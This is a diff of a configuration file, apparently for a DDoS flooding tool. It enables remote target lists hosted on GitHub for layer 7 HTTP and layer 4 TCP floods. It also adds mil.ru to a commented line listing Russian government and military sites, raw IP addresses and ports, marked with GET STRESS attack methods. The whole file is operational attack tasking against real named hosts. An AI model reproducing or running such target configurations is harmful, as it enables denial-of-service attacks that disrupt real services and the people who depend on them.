@@ -6,11 +6,11 @@
 
 -c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/1c/1c_l4_tcp
 
-#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/ofd/ofd_l7_url --http-methods GET POST
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/ofd/ofd_l7_url --http-methods GET POST
 
-#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/ofd/ofd_l7_http --http-methods GET POST
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/ofd/ofd_l7_http --http-methods GET POST
 
-#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/ofd/ofd_l4_tcp
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/ofd/ofd_l4_tcp
 
 #-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/avia/avia_l7_url --http-methods GET STRESS --proxies https://raw.githubusercontent.com/alexnest-ua/special_files/main/screenshots/1.png
 
@@ -70,7 +70,7 @@
 
 #https://195.189.222.59:443 https://194.49.120.61:443 http://195.189.222.42:80 tcp://195.189.222.62:25 https://194.49.120.60:443 https://194.49.120.61:443 tcp://195.189.222.62:465 tcp://194.49.120.61:443 tcp://195.189.222.58:80 tcp://195.189.222.58:465 tcp://178.248.234.88:80 --http-methods GET STRESS
 
-#http://contract-army.ru https://www.voenkoma.net https://gogov.ru/mil http://5.101.152.200:80 http://45.130.41.19:80 http://45.130.41.19:443 https://45.130.41.19:443 http://95.213.199.232:443 https://95.213.199.232:443 http://95.213.199.232:1500 https://95.213.199.232:1500 tcp://5.101.152.200:80 tcp://45.130.41.19:80 tcp://45.130.41.19:443 tcp://95.213.199.232:80 tcp://95.213.199.232:443 tcp://95.213.199.232:1500 --http-methods GET STRESS
+#http://contract-army.ru https://mil.ru https://www.voenkoma.net https://gogov.ru/mil http://5.101.152.200:80 http://45.130.41.19:80 http://45.130.41.19:443 https://45.130.41.19:443 http://95.213.199.232:443 https://95.213.199.232:443 http://95.213.199.232:1500 https://95.213.199.232:1500 tcp://5.101.152.200:80 tcp://45.130.41.19:80 tcp://45.130.41.19:443 tcp://95.213.199.232:80 tcp://95.213.199.232:443 tcp://95.213.199.232:1500 --http-methods GET STRESS
 
 #https://www.cryptopro.ru/order/OrderForm.aspx?catid=c26ac260-7cfc-e811-870f-0025900a9ce7~ http://178.238.112.83:80 http://178.238.112.83:443 https://178.238.112.83:443 tcp://178.238.112.83:80 tcp://178.238.112.83:443 --http-methods GET STRESS
 
